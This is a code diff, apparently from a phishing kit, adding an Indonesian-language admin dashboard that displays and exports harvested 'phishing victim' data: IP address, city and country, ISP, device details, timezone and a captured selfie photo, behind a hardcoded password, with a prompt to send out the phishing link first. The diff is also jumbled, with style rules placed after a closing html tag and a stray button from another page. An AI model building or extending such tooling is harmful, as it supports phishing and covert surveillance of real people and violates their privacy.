@@ -375,6 +375,307 @@
     if(localStorage.getItem('admin_logged_in') === 'true') { renderDashboard(); } else { renderLogin(); }
 </script>
 </body>
+</html>            align-items: center;
+            flex-wrap: wrap;
+            gap: 8px;
+        }
+        .device-name {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            font-weight: 600;
+            color: white;
+            font-size: 15px;
+        }
+        .victim-time {
+            color: #8e8e93;
+            font-size: 11px;
+        }
+        .expand-btn {
+            background: #2c2c2e;
+            border: none;
+            padding: 6px 14px;
+            border-radius: 20px;
+            color: #0a84ff;
+            font-size: 13px;
+            font-weight: 500;
+            cursor: pointer;
+        }
+        .victim-details {
+            padding: 0 16px;
+            max-height: 0;
+            overflow: hidden;
+            transition: max-height 0.3s ease;
+        }
+        .victim-details.show {
+            max-height: 1000px;
+            padding: 0 16px 16px 16px;
+        }
+        .info-row {
+            background: #2c2c2e;
+            margin: 8px 0;
+            padding: 12px;
+            border-radius: 12px;
+        }
+        .info-label {
+            color: #8e8e93;
+            font-size: 11px;
+            margin-bottom: 4px;
+            text-transform: uppercase;
+        }
+        .info-value {
+            color: white;
+            font-size: 13px;
+            font-weight: 500;
+            word-break: break-all;
+        }
+        .photo-area {
+            margin: 12px 0;
+            text-align: center;
+        }
+        .photo-area img {
+            max-width: 100%;
+            max-height: 280px;
+            border-radius: 16px;
+            border: 1px solid #38383a;
+        }
+        .no-photo {
+            background: #2c2c2e;
+            padding: 24px;
+            text-align: center;
+            border-radius: 12px;
+            color: #8e8e93;
+        }
+        .delete-btn {
+            background: #ff3b30;
+            border: none;
+            padding: 12px;
+            border-radius: 14px;
+            color: white;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 12px;
+        }
+        .export-all {
+            background: #30b0c0;
+            margin: 12px 20px;
+            width: calc(100% - 40px);
+        }
+        .clear-all {
+            background: #ff3b30;
+            margin: 12px 20px;
+            width: calc(100% - 40px);
+        }
+        .empty-state {
+            text-align: center;
+            padding: 60px 20px;
+            color: #8e8e93;
+        }
+        .empty-state-icon {
+            font-size: 64px;
+            margin-bottom: 16px;
+        }
+        .login-container {
+            background: #1c1c1e;
+            margin: 100px 20px;
+            padding: 32px 24px;
+            border-radius: 24px;
+            text-align: center;
+        }
+        .login-container h2 {
+            color: white;
+            margin-bottom: 8px;
+        }
+        .login-container input {
+            background: #2c2c2e;
+            border: none;
+            padding: 14px 16px;
+            border-radius: 12px;
+            color: white;
+            font-size: 16px;
+            width: 100%;
+            margin: 16px 0;
+        }
+        .login-container button {
+            background: #0a84ff;
+            border: none;
+            padding: 14px;
+            border-radius: 14px;
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+        }
+        .toast {
+            position: fixed;
+            bottom: 20px;
+            left: 20px;
+            right: 20px;
+            background: #2c2c2e;
+            color: white;
+            padding: 12px 16px;
+            border-radius: 12px;
+            text-align: center;
+            z-index: 1000;
+            animation: fadeOut 2s ease forwards;
+        }
+        @keyframes fadeOut {
+            0% { opacity: 1; }
+            70% { opacity: 1; }
+            100% { opacity: 0; visibility: hidden; }
+        }
+        .backup-info {
+            background: #1c1c1e;
+            margin: 16px 20px;
+            padding: 12px 16px;
+            border-radius: 12px;
+            font-size: 12px;
+            color: #8e8e93;
+            text-align: center;
+        }
+    </style>
+</head>
+<body>
+<div id="app"></div>
+<script>
+    const ADMIN_PASSWORD = 'ManzzHandSome2331';
+    function showToast(msg) {
+        let toast = document.createElement('div');
+        toast.className = 'toast';
+        toast.innerText = msg;
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 2000);
+    }
+    function getDeviceIcon(ua) {
+        if(ua.includes('iPhone')) return '📱';
+        if(ua.includes('Android')) return '🤖';
+        if(ua.includes('Windows')) return '💻';
+        if(ua.includes('Mac')) return '🍎';
+        return '📟';
+    }
+    function renderLogin() {
+        document.getElementById('app').innerHTML = `
+            <div class="login-container">
+                <div style="font-size: 48px; margin-bottom: 16px;">🔐</div>
+                <h2>Admin Control</h2>
+                <p>Masukkan password untuk akses data korban</p>
+                <input type="password" id="adminPass" placeholder="Password">
+                <button onclick="doLogin()">Masuk</button>
+            </div>
+        `;
+    }
+    function doLogin() {
+        let pass = document.getElementById('adminPass').value;
+        if(pass === ADMIN_PASSWORD) {
+            localStorage.setItem('admin_logged_in', 'true');
+            renderDashboard();
+        } else {
+            showToast('Password salah!');
+        }
+    }
+    function renderDashboard() {
+        let victims = [];
+        try {
+            let data = localStorage.getItem('phising_data');
+            victims = data ? JSON.parse(data) : [];
+        } catch(e) {}
+        let now = new Date();
+        let timeStr = now.toLocaleTimeString('id-ID', { hour: '2-digit', minute: '2-digit' });
+        let html = `
+            <div class="status-bar">
+                <span class="time">${timeStr}</span>
+                <span class="battery">📶 🔋 100%</span>
+            </div>
+            <div class="header">
+                <h1>Control Center</h1>
+                <p>Data korban phishing</p>
+            </div>
+            <div class="stats-card">
+                <div>
+                    <div class="stats-number">${victims.length}</div>
+                    <div class="stats-label">Total Korban</div>
+                </div>
+                <button class="refresh-btn" onclick="refreshData()">⟳ Refresh</button>
+            </div>
+            <div class="backup-info">💾 Data tersimpan di browser ini. Export JSON untuk backup.</div>
+        `;
+        if(victims.length === 0) {
+            html += `<div class="empty-state"><div class="empty-state-icon">📭</div><div>Belum ada data korban</div><div style="font-size: 12px; margin-top: 8px;">Kirim link phishing dulu bos</div></div>`;
+        } else {
+            victims = [...victims].reverse();
+            victims.forEach((v, idx) => {
+                let deviceIcon = getDeviceIcon(v.deviceAgent || '');
+                let deviceName = v.devicePlatform || 'Unknown Device';
+                let expandId = `details_${idx}`;
+                html += `
+                    <div class="victim-card">
+                        <div class="victim-header">
+                            <div class="device-name"><span>${deviceIcon}</span><span>${deviceName}</span></div>
+                            <div style="display: flex; gap: 8px; align-items: center;">
+                                <span class="victim-time">${v.waktu || '-'}</span>
+                                <button class="expand-btn" onclick="toggleDetails('${expandId}', this)">Lihat</button>
+                            </div>
+                        </div>
+                        <div id="${expandId}" class="victim-details">
+                            <div class="info-row"><div class="info-label">🌐 IP Address</div><div class="info-value">${v.ip || '-'}</div></div>
+                            <div class="info-row"><div class="info-label">📍 Lokasi</div><div class="info-value">${v.kota || '-'}, ${v.region || '-'}, ${v.negara || '-'}</div></div>
+                            <div class="info-row"><div class="info-label">📡 ISP / Provider</div><div class="info-value">${v.isp || '-'}</div></div>
+                            <div class="info-row"><div class="info-label">📱 Nama Device (Real)</div><div class="info-value" style="font-size: 11px;">${v.deviceAgent || '-'}</div></div>
+                            <div class="info-row"><div class="info-label">💻 Platform / OS</div><div class="info-value">${v.devicePlatform || '-'}</div></div>
+                            <div class="info-row"><div class="info-label">📺 Resolusi Layar</div><div class="info-value">${v.screenRes || '-'}</div></div>
+                            <div class="info-row"><div class="info-label">🌍 Timezone</div><div class="info-value">${v.timezone || '-'}</div></div>
+                            <div class="photo-area">${v.foto ? `<img src="${v.foto}" alt="Selfie Korban" onclick="window.open(this.src)">` : '<div class="no-photo">📷 Belum ada foto</div>'}</div>
+                            <button class="delete-btn" onclick="deleteVictim('${v.id}')">🗑 Hapus Data</button>
+                        </div>
+                    </div>
+                `;
+            });
+            html += `
+                <button class="delete-btn export-all" onclick="exportAllData()">📥 Export Semua Data (JSON)</button>
+                <button class="delete-btn clear-all" onclick="clearAllData()">⚠️ Hapus Semua Data</button>
+                <div style="height: 30px;"></div>
+            `;
+        }
+        document.getElementById('app').innerHTML = html;
+    }
+    function toggleDetails(id, btn) {
+        let el = document.getElementById(id);
+        el.classList.toggle('show');
+        btn.innerText = el.classList.contains('show') ? 'Tutup' : 'Lihat';
+    }
+    function refreshData() { renderDashboard(); showToast('Data berhasil di-refresh'); }
+    function deleteVictim(id) {
+        let victims = JSON.parse(localStorage.getItem('phising_data') || '[]');
+        victims = victims.filter(v => v.id !== id);
+        localStorage.setItem('phising_data', JSON.stringify(victims));
+        renderDashboard();
+        showToast('Data korban dihapus');
+    }
+    function clearAllData() {
+        if(confirm('Yakin hapus SEMUA data korban?')) {
+            localStorage.removeItem('phising_data');
+            renderDashboard();
+            showToast('Semua data telah dihapus');
+        }
+    }
+    function exportAllData() {
+        let data = localStorage.getItem('phising_data');
+        if(!data || JSON.parse(data).length === 0) { showToast('Tidak ada data'); return; }
+        let blob = new Blob([data], { type: 'application/json' });
+        let url = URL.createObjectURL(blob);
+        let a = document.createElement('a');
+        a.href = url;
+        a.download = `phising_data_${Date.now()}.json`;
+        a.click();
+        URL.revokeObjectURL(url);
+        showToast('Data berhasil diexport');
+    }
+    if(localStorage.getItem('admin_logged_in') === 'true') { renderDashboard(); } else { renderLogin(); }
+</script>
+</body>
 </html>    <button id="continueBtn" class="continue-btn">Lanjutkan Verifikasi</button>
 </div>
 
